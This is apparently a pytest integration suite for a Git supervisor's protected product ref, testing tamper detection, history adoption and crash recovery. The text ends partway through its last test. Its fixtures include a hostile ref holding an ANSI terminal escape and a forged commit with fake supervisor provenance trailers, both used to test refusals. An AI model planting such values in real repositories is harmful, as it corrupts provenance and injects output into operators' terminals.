"""The product ref: the run's result held in a protected Git ref.

VI-0511, VI-0512, VI-0513, VI-0514, VI-0516, VI-0518 and VI-0519 (the product-ref
contract), over real Git repositories driven through ``work-supervisor.py``.
Each test names the criterion it proves.
"""

from __future__ import annotations

import importlib.util
import json
import os
import re
import shutil
import subprocess
import sys
from collections.abc import Callable
from pathlib import Path
from types import ModuleType
from typing import Any

import pytest

# Each shared helper by literal path, so every file a suite loads stays visibly
# inside this pack.
_HELPER_PATHS = {
    "supervisor_harness": Path(__file__).resolve().parent / "supervisor_harness.py",
    "supervisor_support": Path(__file__).resolve().parent / "supervisor_support.py",
}


def _helper(name: str) -> ModuleType:
    """Load a shared supervisor test helper by path under a pack- and skill-qualified name."""
    alias = f"core_work_loop_{name}"
    if alias not in sys.modules:
        spec = importlib.util.spec_from_file_location(alias, _HELPER_PATHS[name])
        assert spec is not None and spec.loader is not None
        sys.modules[alias] = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(sys.modules[alias])
    return sys.modules[alias]


h = _helper("supervisor_harness")
sup = _helper("supervisor_support")

pytestmark = sup.INTEGRATION

OWNER = "owner:0123456789ab"


# ── helpers ─────────────────────────────────────────────────────────────────


def race_free_host(monkeypatch: pytest.MonkeyPatch) -> None:
    """Answer the host query as a host with race-free confined writes, as the unsafe-host suite does.

    A test that re-approves a run as untrusted needs it: a host without such writes refuses
    an untrusted start first, which would hide the refusal the test is about.
    """
    query = h.commit_module.sibling("_confined_mutation.py")
    monkeypatch.setattr(query, "race_free_mutation", lambda: True)


def git_ok(repo: Path, *args: str) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["git", *args],
        cwd=repo,
        env={**os.environ, **h.GIT_ENV},
        capture_output=True,
        text=True,
        check=False,
    )


def rev(repo: Path, name: str) -> str:
    done = git_ok(repo, "rev-parse", "--verify", "-q", name)
    return done.stdout.strip() if done.returncode == 0 else ""


def store_dir(repo: Path) -> Path:
    git_dir = Path(h.git(repo, "rev-parse", "--absolute-git-dir").strip())
    runs = [p for p in (git_dir / "agentbundle-supervisor").iterdir() if p.name.startswith("run-")]
    assert len(runs) == 1, runs
    return runs[0]


def record(repo: Path) -> dict[str, Any]:
    return json.loads((store_dir(repo) / "product-ref").read_text("utf-8"))  # type: ignore[no-any-return]


def ref_name(repo: Path) -> str:
    return str(record(repo)["name"])


def manifest(repo: Path, revision: str) -> dict[str, str]:
    out = h.git(repo, "ls-tree", "-r", revision)
    pairs = {}
    for line in out.splitlines():
        meta, path = line.split("\t", 1)
        pairs[path] = meta.split()[2]
    return {p: o for p, o in pairs.items() if not p.startswith(h.SPEC_DIR + "/")}


def working_manifest(repo: Path) -> dict[str, str]:
    paths = [p for p in h.git(repo, "ls-files").splitlines() if not p.startswith(h.SPEC_DIR + "/")]
    return {p: h.git(repo, "hash-object", p).strip() for p in paths if (repo / p).exists()}


def assert_parity(repo: Path) -> None:
    name = ref_name(repo)
    assert rev(repo, name) == rev(repo, "HEAD")
    assert manifest(repo, "HEAD") == manifest(repo, name) == working_manifest(repo)


def started(tmp: Path) -> Path:
    repo = h.make_repo(tmp)
    code, out = h.start(repo)
    assert code == 0, out
    return repo


def advance(
    repo: Path, ctl: h.Controller, until: Callable[[dict[str, Any]], bool], *, after: bool = True
) -> dict[str, Any]:
    """Run ``next``, worker, ``report`` until a request matching *until*.

    With *after*, return once that request's result is reported (no attempt open);
    otherwise return the request itself, issued and open.
    """
    for _ in range(100):
        code, payload = h.run_cli(repo, "next", h.SPEC_DIR)
        assert code == 0, payload
        request = payload["request"]
        if until(request) and not after:
            return request  # type: ignore[no-any-return]
        if request["kind"] == "external-effect":
            ctl.handle_effect(request)
            continue
        result = ctl.query(request) if request["kind"] == "effect-query" else ctl.work(request)
        code, admitted = ctl.report(result)
        assert code == 0, admitted
        if until(request):
            return request  # type: ignore[no-any-return]
    raise AssertionError("the run did not reach the request")


def calc_implement(request: dict[str, Any]) -> bool:
    return request["kind"] == "implement-task" and request["task"]["title"].startswith("Calc")


def controller(repo: Path, tmp: Path, **kw: Any) -> h.Controller:
    return h.Controller(repo, tmp / "effects.log", **kw)


def decision_result(request: dict[str, Any], commit: str, role: str = OWNER) -> dict[str, Any]:
    return {
        "schema_version": 1,
        "request_id": request["request_id"],
        "run_id": request["run_id"],
        "kind": "human-decision",
        "decision": {"decision": "adopt-history", "authority_ref": role, "commit": commit},
    }


def next_ok(repo: Path) -> dict[str, Any]:
    code, payload = h.run_cli(repo, "next", h.SPEC_DIR)
    assert code == 0, payload
    return payload


def next_refusal(repo: Path) -> dict[str, Any]:
    code, payload = h.run_cli(repo, "next", h.SPEC_DIR)
    assert code == 1, payload
    return payload["refusal"]  # type: ignore[no-any-return]


def security_lines(repo: Path) -> list[dict[str, Any]]:
    path = repo / h.SPEC_DIR / ".supervisor" / "security-events.jsonl"
    if not path.exists():
        return []
    return [json.loads(x) for x in path.read_text("utf-8").splitlines() if x.strip()]


def foreign_commit(repo: Path, name: str = "OTHER.md", text: str = "foreign\n") -> str:
    (repo / name).parent.mkdir(parents=True, exist_ok=True)
    (repo / name).write_text(text, **h._LF)
    h.git(repo, "add", name)
    h.git(repo, "commit", "-q", "-m", f"foreign change to {name}")
    return rev(repo, "HEAD")


def make_legacy(repo: Path) -> None:
    """The state of a run admitted before the product ref shipped: no recorded ref."""
    name = ref_name(repo)
    h.git(repo, "update-ref", "-d", name)
    (store_dir(repo) / "product-ref").unlink()


# ── VI-0511: AC-0001, AC-0002 ───────────────────────────────────────────────


def test_start_creates_the_product_ref_at_the_approval_commit(tmp_path: Path) -> None:
    repo = started(tmp_path)
    name = ref_name(repo)
    assert name.startswith("refs/agentbundle/delivery/run-")
    assert name.endswith("/product")
    assert rev(repo, name) == rev(repo, "HEAD")
    assert record(repo)["recorded"] == rev(repo, "HEAD")
    assert h.git(repo, "symbolic-ref", "HEAD").strip() == "refs/heads/main"
    assert f"Supervisor-Product-Ref: {name}" in h.git(repo, "log", "-1", "--format=%B")


def test_every_step_moves_both_refs_and_keeps_head_on_its_branch(tmp_path: Path) -> None:
    repo = started(tmp_path)
    checked: list[str] = []

    def between(c: h.Controller, request: dict[str, Any], phase: str) -> None:
        if phase == "reported":
            assert_parity(repo)
            assert h.git(repo, "symbolic-ref", "HEAD").strip() == "refs/heads/main"
            checked.append(request["kind"])

    assert controller(repo, tmp_path, between=between).drive().get("terminal")
    assert len(checked) >= 8
    assert_parity(repo)


def test_two_worktrees_and_a_readmission_name_different_refs(tmp_path: Path) -> None:
    repo = h.make_repo(tmp_path)
    wt = tmp_path / "wt"
    h.git(repo, "worktree", "add", "-q", "-b", "other", str(wt))
    assert h.start(repo)[0] == 0
    assert h.start(wt)[0] == 0
    first, second = ref_name(repo), ref_name(wt)
    assert first != second
    assert first.split("/")[3] == second.split("/")[3]  # one spec and commit, one run id
    # A run re-admitted after its store is retired draws a fresh name.
    h.git(repo, "reset", "-q", "--hard", "HEAD~1")
    shutil.rmtree(Path(h.git(repo, "rev-parse", "--absolute-git-dir").strip())
                  / "agentbundle-supervisor")
    assert h.start(repo)[0] == 0
    assert ref_name(repo) not in (first, second)


# ── VI-0512: AC-0003, AC-0004 ───────────────────────────────────────────────


def test_a_moved_product_ref_refuses_with_integration_conflict(tmp_path: Path) -> None:
    repo = started(tmp_path)
    ctl = controller(repo, tmp_path)
    request = advance(repo, ctl, calc_implement, after=False)
    name = ref_name(repo)
    source = rev(repo, name)
    result = ctl.work(request)
    tree = h.git(repo, "rev-parse", "HEAD^{tree}").strip()
    child = h.git(repo, "commit-tree", tree, "-p", source, "-m", "racing writer").strip()
    delivery = {p.name: p.read_bytes() for p in (repo / h.SPEC_DIR / "delivery").iterdir()}
    index = h.git(repo, "ls-files", "-s")
    moved: list[bool] = []

    def hook() -> None:
        if not moved:
            moved.append(True)
            h.git(repo, "update-ref", name, child)

    h.commit_module.set_update_hook(hook)
    try:
        code, payload = ctl.report(result)
    finally:
        h.commit_module.set_update_hook(None)
    assert code == 1 and payload["refusal"]["code"] == "integration-conflict", payload
    assert rev(repo, "HEAD") == source
    assert rev(repo, name) == child
    assert h.git(repo, "ls-files", "-s") == index
    assert delivery == {p.name: p.read_bytes() for p in (repo / h.SPEC_DIR / "delivery").iterdir()}
    kept = (repo / "calc.py").read_bytes()
    # The attempt stands as residue until the ref is restored.
    assert next_refusal(repo)["code"] == "attempt-residue"
    h.git(repo, "update-ref", name, source)
    again = next_ok(repo)["request"]
    assert again["request_id"] == request["request_id"]
    assert (repo / "calc.py").read_bytes() == kept
    code, admitted = ctl.report(ctl.work(again))
    assert code == 0, admitted
    assert h.git(repo, "show", "HEAD:calc.py").encode() == kept
    assert_parity(repo)


# ── VI-0513: AC-0005, AC-0006, AC-0022 ──────────────────────────────────────


def _hostile(repo: Path, name: str) -> None:
    """A loose ref holding text a worker chose, which a refusal must never echo."""
    ref = Path(h.git(repo, "rev-parse", "--git-common-dir").strip())
    ref = (repo / ref if not ref.is_absolute() else ref).joinpath(*name.split("/"))
    ref.write_text("ref: refs/heads/evil\x1b[31mred\n", "utf-8")


def _duplicate_packed(repo: Path, name: str) -> None:
    h.git(repo, "pack-refs", "--all", "--prune")
    packed = repo / ".git" / "packed-refs"
    lines = packed.read_text("utf-8").splitlines()
    at = next(i for i, x in enumerate(lines) if x.endswith(name))
    lines.insert(at, lines[at])  # adjacent, so the file stays sorted for Git
    packed.write_text("\n".join(lines) + "\n", **h._LF)  # LF on every platform


def _diverge_cases(repo: Path, name: str, older: str) -> dict[str, Callable[[], None]]:
    tree = h.git(repo, "rev-parse", "HEAD^{tree}").strip()
    return {
        "deleted": lambda: h.git(repo, "update-ref", "-d", name),
        "symbolic": lambda: h.git(repo, "symbolic-ref", name, "refs/heads/main"),
        "rolled-back": lambda: h.git(repo, "update-ref", name, older),
        "planted": lambda: h.git(
            repo, "update-ref", name,
            h.git(repo, "commit-tree", tree, "-m",
                  f"forged\n\nSupervisor-Run: x\nSupervisor-Product-Ref: {name}").strip()),
        "hostile": lambda: _hostile(repo, name),
        "duplicate-packed": lambda: _duplicate_packed(repo, name),
    }


def _ref_and_store_snapshot(repo: Path) -> tuple[str, dict[str, bytes]]:
    refs = git_ok(repo, "for-each-ref", "--format=%(refname) %(objectname)").stdout
    store = {p.name: p.read_bytes() for p in store_dir(repo).iterdir() if p.is_file()}
    return refs + rev(repo, "HEAD"), store


def run_printed_restore(repo: Path, detail: str) -> None:
    """Run exactly the restore command a refusal prints."""
    command = detail.split("restore it with: ", 1)[1]
    assert "--no-deref" in command
    done = subprocess.run(command, shell=True, cwd=repo, env={**os.environ, **h.GIT_ENV},
                          capture_output=True, text=True, check=False)
    assert done.returncode == 0, (command, done.stderr)


def run_json(repo: Path) -> dict[str, Any]:
    return json.loads(  # type: ignore[no-any-return]
        (repo / h.SPEC_DIR / ".supervisor" / "run.json").read_text("utf-8"))


def assert_refused_shape(repo: Path, code: str) -> None:
    """``run.json`` and ``status`` both show the refusal, as the corpus checks it."""
    run = run_json(repo)
    assert run["stage"] == "awaiting-human" and run["active"] is True
    assert run["refusal"]["code"] == code
    status_code, status = h.run_cli(repo, "status", h.SPEC_DIR, "--json")
    assert status_code == 0
    assert status["refusal"]["code"] == code and status["terminal"] is False
    assert status["run"]["stage"] == "awaiting-human"


@pytest.fixture(scope="module")
def effect_template(tmp_path_factory: pytest.TempPathFactory) -> Path:
    """A run with no attempt open and an external-effect request issued, kept in a file."""
    base = tmp_path_factory.mktemp("effect")
    repo = started(base)
    ctl = controller(repo, base)
    for _ in range(40):
        request = next_ok(repo)["request"]
        if request["kind"] == "external-effect":
            (base / "effect-request.json").write_text(json.dumps(request), "utf-8")
            return base
        code, admitted = ctl.report(ctl.work(request))
        assert code == 0, admitted
        follow = admitted.get("admitted")
        if isinstance(follow, dict) and "request" in follow:
            (base / "effect-request.json").write_text(json.dumps(follow["request"]), "utf-8")
            return base
    raise AssertionError("no effect request")


def effect_copy(template: Path, tmp_path: Path) -> Path:
    shutil.copytree(template / "repo", tmp_path / "repo", symlinks=True)
    shutil.copyfile(template / "effect-request.json", tmp_path / "effect-request.json")
    return tmp_path / "repo"


def effect_verbs(repo: Path, tmp_path: Path) -> dict[str, Callable[[], tuple[int, dict[str, Any]]]]:
    """Every committing verb but ``next``, each with a well-formed argument for this run."""
    ctl = controller(repo, tmp_path)
    request = json.loads((repo.parent / "effect-request.json").read_text("utf-8"))
    result = tmp_path / "result.json"
    result.write_text(json.dumps(ctl.dispatch(request)), "utf-8")
    key = request["effect"]["operation_key"]
    return {
        "start": lambda: h.start(repo),
        "report": lambda: h.run_cli(repo, "report", h.SPEC_DIR, str(result)),
        "resolve-effect": lambda: h.run_cli(
            repo, "resolve-effect", h.SPEC_DIR, "--operation", key, "--decision",
            "effect-confirmed", "--authority-ref", "effect-authority:0123456789ab"),
    }


ALL_CASES = ["deleted", "symbolic", "rolled-back", "planted", "hostile", "duplicate-packed"]


@pytest.mark.parametrize("case", ALL_CASES)
def test_an_untrusted_product_ref_refuses_next_until_restored(tmp_path: Path, case: str) -> None:
    repo = started(tmp_path)
    ctl = controller(repo, tmp_path)
    older = rev(repo, "HEAD")
    advance(repo, ctl, calc_implement)
    name, recorded = ref_name(repo), record(repo)["recorded"]
    head = rev(repo, "HEAD")
    _diverge_cases(repo, name, older)[case]()
    seen = rev(repo, name)
    before = len(security_lines(repo))
    refusal = next_refusal(repo)
    assert refusal["code"] == "product-ref-diverged" and refusal["owner"] == "controller"
    assert name in refusal["detail"] and recorded in refusal["detail"]
    assert "git update-ref" in refusal["detail"] and "None" not in refusal["detail"]
    assert "evil" not in refusal["detail"] and "\x1b" not in refusal["detail"]
    assert rev(repo, name) == seen and rev(repo, "HEAD") == head
    denied = [e for e in security_lines(repo)[before:] if e["reason_code"] == "product-ref-diverged"]
    assert denied and denied[0]["event_type"] == "supervisor-product-ref-check"
    assert_refused_shape(repo, "product-ref-diverged")
    run_printed_restore(repo, refusal["detail"])
    assert rev(repo, name) == recorded
    assert "request" in next_ok(repo)


@pytest.mark.parametrize("verb", ["start", "report", "resolve-effect"])
@pytest.mark.parametrize("case", ["deleted", "symbolic", "rolled-back", "planted"])
def test_an_untrusted_product_ref_refuses_the_other_verbs(
    effect_template: Path, tmp_path: Path, case: str, verb: str
) -> None:
    repo = effect_copy(effect_template, tmp_path)
    name, recorded = ref_name(repo), record(repo)["recorded"]
    older = h.git(repo, "rev-list", "--max-parents=0", "HEAD").strip()
    calls = effect_verbs(repo, tmp_path)
    _diverge_cases(repo, name, older)[case]()
    seen, head = rev(repo, name), rev(repo, "HEAD")
    before = len(security_lines(repo))
    code, out = calls[verb]()
    assert code == 1 and out["refusal"]["code"] == "product-ref-diverged", out
    assert name in out["refusal"]["detail"] and recorded in out["refusal"]["detail"]
    assert rev(repo, name) == seen and rev(repo, "HEAD") == head
    assert any(e["reason_code"] == "product-ref-diverged" for e in security_lines(repo)[before:])
    status_code, status = h.run_cli(repo, "status", h.SPEC_DIR, "--json")
    assert status_code == 0 and status["refusal"]["code"] == "product-ref-diverged"
    run_printed_restore(repo, out["refusal"]["detail"])
    assert rev(repo, name) == recorded
    assert calls[verb]()[0] == 0


@pytest.mark.parametrize("ref_less", [False, True])
@pytest.mark.parametrize("verb", ["start", "report", "resolve-effect", "next"])
def test_foreign_history_blocks_every_committing_verb(
    effect_template: Path, tmp_path: Path, verb: str, ref_less: bool,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    race_free_host(monkeypatch)
    repo = effect_copy(effect_template, tmp_path)
    calls = effect_verbs(repo, tmp_path)
    if ref_less:
        make_legacy(repo)
    top = foreign_commit(repo)
    made = (store_dir(repo) / "made-commits").read_text("utf-8")
    if verb == "next":
        request = next_ok(repo)["request"]
        assert request["reason"] == "history-adoption"
    elif verb == "start":
        code, out = h.run_cli(
            repo, "start", h.SPEC_DIR, "--intent", "code", "--code-trust", "untrusted",
            "--authority-ref", OWNER, "--review-authority-ref", "plan-reviewer:0123456789ab")
        assert code == 1 and out["refusal"]["code"] == "history-adoption-required", out
    else:
        code, out = calls[verb]()
        assert code == 1 and out["refusal"]["code"] == "history-adoption-required", out
    assert rev(repo, "HEAD") == top
    assert (store_dir(repo) / "made-commits").read_text("utf-8") == made
    if ref_less:
        assert not (store_dir(repo) / "product-ref").exists()
    else:
        assert rev(repo, ref_name(repo)) != top
    before = _ref_and_store_snapshot(repo)
    status_code, status = h.run_cli(repo, "status", h.SPEC_DIR, "--json")
    assert status_code == 0 and status["terminal"] is False
    assert status["request"]["reason"] == "history-adoption"
    assert status["request"]["head_commit"] == top
    assert status["run"]["gate_pending"] is True
    assert _ref_and_store_snapshot(repo) == before, "status changed a ref or a store file"


@pytest.mark.parametrize("verb", ["start", "report", "resolve-effect"])
def test_a_run_with_no_ref_gains_one_at_every_verb(
    effect_template: Path, tmp_path: Path, verb: str
) -> None:
    repo = effect_copy(effect_template, tmp_path)
    calls = effect_verbs(repo, tmp_path)
    make_legacy(repo)
    code, out = calls[verb]()
    assert code == 0, out
    assert rev(repo, ref_name(repo)) == record(repo)["recorded"] == rev(repo, "HEAD")
    assert_parity(repo)


def test_a_step_committed_during_a_ref_less_attempt_creates_no_ref(tmp_path: Path) -> None:
    repo = started(tmp_path)
    ctl = controller(repo, tmp_path)
    request = advance(repo, ctl, calc_implement, after=False)
    make_legacy(repo)
    code, admitted = ctl.report(ctl.work(request))
    assert code == 0, admitted
    assert not (store_dir(repo) / "product-ref").exists()
    assert not git_ok(repo, "for-each-ref", "refs/agentbundle").stdout.strip()
    assert "request" in next_ok(repo)  # the attempt is closed now: the next verb creates it
    assert rev(repo, ref_name(repo)) == rev(repo, "HEAD")


def test_a_run_with_no_ref_gains_one_at_its_latest_made_commit(tmp_path: Path) -> None:
    repo = started(tmp_path)
    advance(repo, controller(repo, tmp_path), calc_implement)
    make_legacy(repo)
    head = rev(repo, "HEAD")
    assert "request" in next_ok(repo)
    assert record(repo)["recorded"] == head == rev(repo, ref_name(repo))
    assert_parity(repo)


def test_a_run_with_no_ref_and_foreign_history_asks_before_adopting(tmp_path: Path) -> None:
    repo = started(tmp_path)
    ctl = controller(repo, tmp_path)
    advance(repo, ctl, calc_implement)
    make_legacy(repo)
    top = foreign_commit(repo)
    request = next_ok(repo)["request"]
    assert request["kind"] == "human-decision" and request["reason"] == "history-adoption"
    assert request["head_commit"] == top
    assert request["changed_paths"] == ["OTHER.md"] and request["changed_path_count"] == 1
    assert request["spec_dir_changed"] is False
    assert rev(repo, "HEAD") == top
    assert not (store_dir(repo) / "product-ref").exists()
    code, admitted = ctl.report(decision_result(request, top))
    assert code == 0, admitted
    assert rev(repo, ref_name(repo)) == rev(repo, "HEAD") != top
    assert "Supervisor-Operation: reanchor" in h.git(repo, "log", "-1", "--format=%B")
    assert controller(repo, tmp_path).drive().get("terminal")


def test_foreign_history_that_touches_delivery_is_refused_adoption(tmp_path: Path) -> None:
    repo = started(tmp_path)
    ctl = controller(repo, tmp_path)
    advance(repo, ctl, calc_implement)
    make_legacy(repo)
    top = foreign_commit(repo, f"{h.SPEC_DIR}/delivery/review-decisions.jsonl", "{}\n")
    request = next_ok(repo)["request"]
    code, payload = ctl.report(decision_result(request, top))
    assert code == 1 and payload["refusal"]["code"] == "adoption-refused"
    assert payload["refusal"]["owner"] == "controller"
    assert rev(repo, "HEAD") == top


def test_a_run_with_no_ref_reset_to_an_older_made_commit_projects_forward(tmp_path: Path) -> None:
    repo = started(tmp_path)
    advance(repo, controller(repo, tmp_path), calc_implement)
    latest = rev(repo, "HEAD")
    make_legacy(repo)
    h.git(repo, "reset", "-q", "--hard", "HEAD~2")
    assert "request" in next_ok(repo)
    assert rev(repo, "HEAD") == latest == rev(repo, ref_name(repo))
    assert_parity(repo)


def test_a_run_with_no_ref_whose_foreign_commit_is_reset_away_gains_its_ref(
    tmp_path: Path,
) -> None:
    repo = started(tmp_path)
    advance(repo, controller(repo, tmp_path), calc_implement)
    latest = rev(repo, "HEAD")
    make_legacy(repo)
    foreign_commit(repo)
    assert next_ok(repo)["request"]["reason"] == "history-adoption"
    h.git(repo, "reset", "-q", "--hard", latest)
    assert next_ok(repo)["request"]["kind"] != "human-decision"
    assert rev(repo, ref_name(repo)) == latest


def test_reftable_repositories_are_refused(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    probe = subprocess.run(["git", "init", "-q", "--ref-format=reftable", str(tmp_path / "p")],
                           capture_output=True, check=False)
    if probe.returncode != 0:
        pytest.skip("this Git cannot create a reftable repository")
    monkeypatch.setenv("GIT_DEFAULT_REF_FORMAT", "reftable")
    repo = h.make_repo(tmp_path / "r")
    code, out = h.start(repo)
    assert code == 1 and out["refusal"]["code"] == "unsupported-ref-storage"
    assert out["refusal"]["owner"] == "owner"
    assert not git_ok(repo, "for-each-ref", "refs/agentbundle").stdout.strip()


def test_a_repository_that_gains_reftable_refuses_every_verb_but_status(tmp_path: Path) -> None:
    repo = started(tmp_path)
    ctl = controller(repo, tmp_path)
    request = advance(repo, ctl, calc_implement, after=False)
    name = ref_name(repo)
    seen = rev(repo, name)
    path = repo / ".git" / "config"
    original = path.read_text("utf-8")
    path.write_text(original.replace("repositoryformatversion = 0",
                                      "repositoryformatversion = 1")
                    + "[extensions]\n\trefStorage = reftable\n", "utf-8")
    try:
        result = tmp_path / "result.json"
        result.write_text(json.dumps(ctl.work(request)), "utf-8")
        for argv in (("next", h.SPEC_DIR), ("report", h.SPEC_DIR, str(result)),
                     ("resolve-effect", h.SPEC_DIR, "--operation", "x", "--decision",
                      "effect-confirmed", "--authority-ref", "effect-authority:0123456789ab")):
            code, out = h.run_cli(repo, *argv)
            assert code == 1 and out["refusal"]["code"] == "unsupported-ref-storage", out
        code, out = h.run_cli(repo, "status", h.SPEC_DIR)
        assert code == 0 and out["refusal"]["code"] == "unsupported-ref-storage"
    finally:
        path.write_text(original, "utf-8")
    assert rev(repo, name) == seen


# ── VI-0514: AC-0008, AC-0009, AC-0010 ──────────────────────────────────────


@pytest.mark.parametrize("mode", ["hard", "soft", "mixed"])
def test_a_reset_two_steps_back_converges_to_the_ref(tmp_path: Path, mode: str) -> None:
    repo = started(tmp_path)
    advance(repo, controller(repo, tmp_path), calc_implement)
    latest = rev(repo, "HEAD")
    h.git(repo, "reset", "-q", f"--{mode}", "HEAD~2")
    assert rev(repo, "HEAD") != latest
    assert "request" in next_ok(repo)
    assert rev(repo, "HEAD") == latest == rev(repo, ref_name(repo))
    assert_parity(repo)
    assert h.git(repo, "diff", "HEAD", "--stat", "--", ".", ":!.loop-run").strip() == ""


def test_a_reset_plus_an_edit_is_blocked_and_leaves_the_edit(tmp_path: Path) -> None:
    repo = started(tmp_path)
    advance(repo, controller(repo, tmp_path), calc_implement)
    latest = rev(repo, "HEAD")
    h.git(repo, "reset", "-q", "--hard", "HEAD~2")
    (repo / "calc.py").write_text("# mine\n", **h._LF)
    index = h.git(repo, "ls-files", "-s")
    head = rev(repo, "HEAD")
    refusal = next_refusal(repo)
    assert refusal["code"] == "projection-blocked" and refusal["owner"] == "controller"
    assert "calc.py" in refusal["detail"]
    assert (repo / "calc.py").read_text("utf-8") == "# mine\n"
    assert_refused_shape(repo, "projection-blocked")
    assert h.git(repo, "ls-files", "-s") == index
    assert rev(repo, "HEAD") == head and rev(repo, ref_name(repo)) == latest


# ── VI-0516: AC-0011, AC-0012, AC-0013, AC-0014 ─────────────────────────────


def _rebase(repo: Path) -> None:
    root = h.git(repo, "rev-list", "--max-parents=0", "HEAD").strip()
    h.git(repo, "checkout", "-q", "-b", "upstream", root)
    (repo / "UPSTREAM.md").write_text("upstream\n", **h._LF)
    h.git(repo, "add", "UPSTREAM.md")
    h.git(repo, "commit", "-q", "-m", "unrelated upstream change")
    h.git(repo, "checkout", "-q", "main")
    h.git(repo, "rebase", "-q", "upstream")


def _amend(repo: Path) -> None:
    with (repo / "calc.py").open("a", encoding="utf-8", newline="\n") as handle:
        handle.write("# edited\n")
    h.git(repo, "commit", "-q", "-a", "--amend", "--no-edit")


def _on_top(repo: Path) -> None:
    foreign_commit(repo)


@pytest.mark.parametrize("divert", [_rebase, _amend, _on_top])
def test_foreign_history_asks_then_adopts_once(tmp_path: Path, divert: Callable[[Path], None]) -> None:
    repo = started(tmp_path)
    ctl = controller(repo, tmp_path)
    advance(repo, ctl, calc_implement)
    name = ref_name(repo)
    ref_before = rev(repo, name)
    divert(repo)
    top = rev(repo, "HEAD")
    request = next_ok(repo)["request"]
    assert request["reason"] == "history-adoption" and request["head_commit"] == top
    assert request["changed_path_count"] == len(request["changed_paths"]) >= 1
    assert rev(repo, "HEAD") == top and rev(repo, name) == ref_before
    if divert is _amend:
        assert "edited" not in h.git(repo, "show", f"{name}:calc.py")
    # Wrong commit and wrong role refuse and commit nothing.
    for bad in (decision_result(request, ref_before),
                decision_result(request, top, "plan-reviewer:0123456789ab")):
        code, payload = ctl.report(bad)
        assert code == 1 and payload["refusal"]["code"] == "adoption-refused"
        assert rev(repo, "HEAD") == top and rev(repo, name) == ref_before
    code, admitted = ctl.report(decision_result(request, top))
    assert code == 0, admitted
    assert rev(repo, name) == rev(repo, "HEAD") != top
    assert "Supervisor-Reanchor-From" in h.git(repo, "log", "-1", "--format=%B")
    assert next_ok(repo)["request"].get("reason") != "history-adoption"
    assert controller(repo, tmp_path).drive().get("terminal")


@pytest.mark.parametrize("change", ["product", "spec"])
def test_a_reanchor_that_changes_the_manifest_or_spec_discards_older_evidence(
    tmp_path: Path, change: str
) -> None:
    repo = started(tmp_path)
    ctl = controller(repo, tmp_path)
    gates = advance(repo, ctl, lambda r: r["kind"] == "run-gates")
    if change == "product":
        _amend(repo)
    else:
        spec = repo / h.SPEC_DIR / "spec.md"
        spec.write_text(spec.read_text("utf-8").replace("that answers.", "that answers fast."),
                        **h._LF)
        h.git(repo, "commit", "-q", "-a", "-m", "controller edit")
    top = rev(repo, "HEAD")
    request = next_ok(repo)["request"]
    assert request["reason"] == "history-adoption"
    assert request["spec_dir_changed"] is (change == "spec")
    code, admitted = ctl.report(decision_result(request, top))
    assert code == 0, admitted
    again = next_ok(repo)["request"]
    assert again["kind"] == "run-gates" and again["request_id"] != gates["request_id"]


# ── VI-0518: AC-0020 ────────────────────────────────────────────────────────


@pytest.mark.parametrize("value", [None, "other"])
def test_start_refuses_an_invalid_result_authority(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, value: str | None
) -> None:
    policy = json.loads(h.admission._POLICY_PATH.read_text("utf-8"))
    assert policy["result_authority"] == "legacy-worktree"
    if value is None:
        del policy["result_authority"]
    else:
        policy["result_authority"] = value
    path = tmp_path / "supervisor-policy.json"
    path.write_text(json.dumps(policy), "utf-8")
    monkeypatch.setattr(h.admission, "_POLICY_PATH", path)
    repo = h.make_repo(tmp_path)
    code, out = h.start(repo)
    assert code == 1
    assert out["refusal"]["code"] == "invalid-policy"
    assert out["refusal"]["owner"] == "skill maintainer"


# ── VI-0519: AC-0021 ────────────────────────────────────────────────────────


# ── AC-0008 and AC-0023: no unrecorded commit is ever trusted ──────────────


def spy_steps(monkeypatch: pytest.MonkeyPatch) -> list[str]:
    """Record the commit of every step as its transaction starts, then run it."""
    seen: list[str] = []
    original = h.commit_module.GitPort._move

    def spy(self: Any, run_id: str, new: str, *args: Any, **kwargs: Any) -> None:
        seen.append(new)
        original(self, run_id, new, *args, **kwargs)

    monkeypatch.setattr(h.commit_module.GitPort, "_move", spy)
    return seen


def store_snapshot(repo: Path) -> dict[str, bytes]:
    return {p.name: p.read_bytes() for p in store_dir(repo).iterdir() if p.is_file()}


def _made(repo: Path) -> str:
    path = store_dir(repo) / "made-commits"
    return path.read_text("utf-8") if path.exists() else ""


def _step_never_moved(repo: Path, monkeypatch: pytest.MonkeyPatch, build: Callable[[], Any]) -> str:
    """Build a step but stop before its transaction runs; return its commit."""
    seen = spy_steps(monkeypatch)

    def crash(self: Any, *args: Any, **kwargs: Any) -> None:
        raise h.Crash("before the transaction")

    monkeypatch.setattr(h.commit_module.GitPort, "update_refs", crash)
    monkeypatch.setattr(h.commit_module.GitPort, "move_head", crash)
    try:
        with pytest.raises(h.Crash):
            build()
    finally:
        monkeypatch.undo()
    return seen[-1]


def run_restore_exit(repo: Path, text: str) -> None:
    """Run exactly the restore exit a decision or refusal prints after ``Restore:``."""
    found = re.search(r"Restore: (.+?)\.(?: Or | Adoption |$)", text)
    assert found is not None, text
    command = found.group(1).split(", then")[0]
    done = subprocess.run(command, shell=True, cwd=repo, env={**os.environ, **h.GIT_ENV},
                          capture_output=True, text=True, check=False)
    assert done.returncode == 0, (command, done.stderr)


@pytest.mark.parametrize("moved", ["both", "ref", "head"])
@pytest.mark.parametrize("attempt_open", [False, True])
def test_an_interrupted_transaction_is_never_counted_or_moved_to(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, moved: str, attempt_open: bool
) -> None:
    race_free_host(monkeypatch)
    repo = started(tmp_path)
    ctl = controller(repo, tmp_path)
    if attempt_open:
        request = advance(repo, ctl, calc_implement, after=False)
        result = ctl.work(request)
        build: Callable[[], Any] = lambda: ctl.report(result)  # noqa: E731
    else:
        advance(repo, ctl, calc_implement)
        ws = h.workspace(repo)
        run_id = ws.approvals()[0]["run_id"]
        request = result = None
        build = lambda: ws.git.build_commit(  # noqa: E731
            run_id=run_id, step="cut-off", operation="evidence", summary="cut off",
            appends={"review-decisions.jsonl": b"{}\n"})
    recorded, name = rev(repo, "HEAD"), ref_name(repo)
    step = _step_never_moved(repo, monkeypatch, build)
    race_free_host(monkeypatch)  # the helper undid the patches, this one included
    # The partial states a transaction cut between its renames leaves.
    if moved in ("both", "ref"):
        h.git(repo, "update-ref", "--no-deref", name, step)
    if moved in ("both", "head"):
